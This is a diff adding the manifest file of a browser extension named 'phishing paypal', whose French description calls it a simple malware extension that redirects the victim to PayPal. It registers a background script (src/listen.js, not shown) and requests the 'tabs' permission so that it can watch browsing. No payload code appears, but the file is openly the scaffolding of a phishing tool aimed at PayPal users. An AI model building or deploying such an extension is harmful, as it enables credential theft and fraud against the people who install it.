@@ -1,0 +1,17 @@
+{
+  "name": "phishing paypal",
+  "version": "1.0.0",
+  "manifest_version": 2,
+  "description": "simple malware extension qui redirige la victime vers paypal",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "background": {
+    "scripts": ["src/listen.js"]
+  },
+  "permissions": [
+    "tabs"
+  ]
+}
